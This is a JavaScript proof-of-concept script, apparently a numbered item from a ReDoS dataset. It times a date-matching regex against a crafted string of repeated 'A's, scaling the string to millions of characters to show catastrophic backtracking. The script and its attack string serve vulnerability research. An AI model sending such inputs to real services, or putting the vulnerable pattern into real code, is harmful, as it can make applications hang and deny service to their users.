/* 4698
 * ([A-Za-z]{0,}[\.\,\s]{0,}[A-Za-z]{1,}[\.\s]{1,}[0-9]{1,2}[\,\s]{0,}[0-9]{4})| ([0-9]{0,4}[-,\s]{0,}[A-Za-z]{3,9}[-,\s]{0,}[0-9]{1,2}[-,\s]{0,}[A-Za-z]{0,8})| ([0-9]{1,4}[\/\.\-][0-9]{1,4}[\/\.\-][0-9]{1,4})
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"A"*1024+"!1 _SLQ_1"
 */
var REGEX = new RegExp("([A-Za-z]{0,}[\.\,\s]{0,}[A-Za-z]{1,}[\.\s]{1,}[0-9]{1,2}[\,\s]{0,}[0-9]{4})| ([0-9]{0,4}[-,\s]{0,}[A-Za-z]{3,9}[-,\s]{0,}[0-9]{1,2}[-,\s]{0,}[A-Za-z]{0,8})| ([0-9]{1,4}[\/\.\-][0-9]{1,4}[\/\.\-][0-9]{1,4})")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + 'A'.repeat(i*1) + '!1 _SLQ_1'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}